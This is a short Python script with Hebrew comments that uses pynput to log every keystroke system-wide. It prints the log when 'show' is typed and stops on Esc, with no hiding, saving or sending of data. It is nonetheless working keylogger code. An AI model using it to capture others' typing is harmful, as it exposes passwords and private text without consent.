from pynput.keyboard import Listener, Key
from datetime import datetime

keystring = []
buffer = []

def show_keys():
    if keystring:
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]")
        print(''.join(keystring))
    else:
        print("\nלא נלחצו מקשים עדיין.")

def on_press(key):
    try:
        if key == Key.esc:
            print("Esc was pressed — exiting...")
            return False
        # ננסה לקרוא את key.char (אות/מספר/סימן רגיל)
        char = key.char
        if char:
            keystring.append(char)
            buffer.append(char)

            if len(buffer) > 4:
                buffer.pop(0)

            if ''.join(buffer).lower() == "show":
                show_keys()
                buffer.clear()
        else:
            # char הוא None (למשל numpad או תו לא מזוהה)
            keystring.append(str(key))  # נשמור אותו בצורה ברורה
            buffer.clear()
    except AttributeError:
        # מקשים מיוחדים כמו Key.space, Key.enter וכו'
        keystring.append(f"[{key.name}]")  # ייתן תוצאה כמו [space] או [enter]
        buffer.clear()

with Listener(on_press=on_press) as listener:
    listener.join()